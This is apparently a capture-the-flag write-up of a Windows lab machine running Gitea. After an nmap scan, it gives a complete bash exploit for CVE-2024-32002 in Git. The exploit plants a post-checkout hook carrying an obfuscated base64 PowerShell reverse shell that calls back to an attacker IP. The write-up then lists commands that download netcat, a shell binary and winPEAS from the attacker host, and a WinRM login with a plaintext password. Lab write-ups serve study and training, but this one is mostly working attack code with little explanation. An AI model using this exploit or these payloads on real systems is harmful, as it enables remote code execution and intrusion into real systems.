```bash
┌─[✗]─[aexon@parrot]─[~]
└──╼ $nmap -sCV -p- 10.10.11.26 --min-rate 1000 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2024-08-19 15:08 WIB
Nmap scan report for 10.10.11.26
Host is up (1.5s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
3000/tcp open  http?   Golang net/http server
|_http-title: Git
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=d50390b96dcc0948; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=7GH80iRe9rKgu-DOQywjBHFqi_c6MTcyNDA1NDY2MjI3OTcwMTQwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 19 Aug 2024 08:04:22 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-arc-green">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Git</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0Iiwic2hvcnRfbmFtZSI6IkdpdCIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jb21waWxlZC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNvbXBpbGVkLmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vZ2l0ZWEuY29tcGlsZWQuaHRiOjMwMDA
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: HEAD
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=a99a52c4a8d02141; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=hzsCgu3231MNm4IHOo27cuWUGTw6MTcyNDA1NDY2OTE3ODQ5MzAwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 19 Aug 2024 08:04:29 GMT
|_    Content-Length: 0
5000/tcp open  upnp?
| fingerprint-strings: 
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.95%I=7%D=8/19%Time=66C2FF32%P=x86_64-unknown-linux-gnu
SF:%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
SF:Bad\x20Request")%r(GetRequest,3000,"HTTP/1\.0\x20200\x20OK\r\nCache-Con
SF:trol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\n
SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_g
SF:itea=d50390b96dcc0948;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-C
SF:ookie:\x20_csrf=7GH80iRe9rKgu-DOQywjBHFqi_c6MTcyNDA1NDY2MjI3OTcwMTQwMA;
SF:\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-O
SF:ptions:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2019\x20Aug\x202024\x2008:04:22
SF:\x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"t
SF:heme-arc-green\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"wi
SF:dth=device-width,\x20initial-scale=1\">\n\t<title>Git</title>\n\t<link\
SF:x20rel=\"manifest\"\x20href=\"data:application/json;base64,eyJuYW1lIjoi
SF:R2l0Iiwic2hvcnRfbmFtZSI6IkdpdCIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jb21
SF:waWxlZC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNvbXBpbG
SF:VkLmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic
SF:2l6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vZ2l0ZWEuY29tcGlsZWQuaHRiOjMw
SF:MDA")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x2
SF:0text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad
SF:\x20Request")%r(HTTPOptions,1B1,"HTTP/1\.0\x20405\x20Method\x20Not\x20A
SF:llowed\r\nAllow:\x20HEAD\r\nAllow:\x20HEAD\r\nAllow:\x20HEAD\r\nAllow:\
SF:x20GET\r\nCache-Control:\x20max-age=0,\x20private,\x20must-revalidate,\
SF:x20no-transform\r\nSet-Cookie:\x20i_like_gitea=a99a52c4a8d02141;\x20Pat
SF:h=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csrf=hzsCgu3231MNm
SF:4IHOo27cuWUGTw6MTcyNDA1NDY2OTE3ODQ5MzAwMA;\x20Path=/;\x20Max-Age=86400;
SF:\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate
SF::\x20Mon,\x2019\x20Aug\x202024\x2008:04:29\x20GMT\r\nContent-Length:\x2
SF:00\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
SF:\r\n400\x20Bad\x20Request");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5000-TCP:V=7.95%I=7%D=8/19%Time=66C2FF41%P=x86_64-unknown-linux-gnu
SF:%r(RTSPRequest,16C,"<!DOCTYPE\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20
SF:\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"utf-
SF:8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\
SF:n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:<p>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Messag
SF:e:\x20Bad\x20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20400\x20-\x20Bad\
SF:x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20
SF:\x20</body>\n</html>\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 553.96 seconds
┌─[aexon@parrot]─[~]
└──╼ $
```


Git version `2.45.0` installed on the Windows machine, we can test it with CVE-2024-32002

**Exploit code:**

```bash
#!/bin/bash

# Set Git configuration options
git config --global protocol.file.allow always
git config --global core.symlinks true
# to avoid the warning message
git config --global init.defaultBranch main 


# Pre-created remote Gitea hook repository
hook_repo_path="http://gitea.compiled.htb:3000/aexon/hook.git"

# Initialize the hook repository
git clone "$hook_repo_path"
cd hook
mkdir -p y/hooks

# Write the malicious code to a hook
cat > y/hooks/post-checkout <<EOF
#!/bin/bash
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAxADcAIgAsADQANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
EOF

# Make the hook executable: important
chmod +x y/hooks/post-checkout

git add y/hooks/post-checkout

# Push the changes back to the Gitea repository
git commit -m "post-checkout"
git push

# Leave hook repo
cd ..

# Pre-created remote Gitea captain repository
captain_repo_path="http://gitea.compiled.htb:3000/aexon/captain.git"

# Initialize the captain repository & add submodule pointing to hook
git clone "$captain_repo_path"
cd captain
git submodule add --name x/y "$hook_repo_path" A/modules/x
git commit -m "add-submodule"

# Create a symlink
printf ".git" > dotgit.txt
git hash-object -w --stdin < dotgit.txt > dot-git.hash
printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
git update-index --index-info < index.info

# Commit and push the changes back to the Gitea repository
git commit -m "add-symlink"
git push

# Leave captain repo
cd ..
```


**User Flag:**
```bash
Invoke-WebRequest -Uri "http://10.10.14.117:8080/nc64.exe" -OutFile "nc64.exe"

certutil -urlcache -split -f "http://10.10.14.117:8080/nc64.exe" "nc64.exe"

Invoke-WebRequest -Uri "http://10.10.14.117:8000/shell.exe" -OutFile "shell.exe"


Invoke-WebRequest -Uri "http://10.10.14.117:8000/winPEAS.ps1" -OutFile "winPEAS.ps1"

```

evil-winrm -i 10.10.11.26 -u emily -p 12345678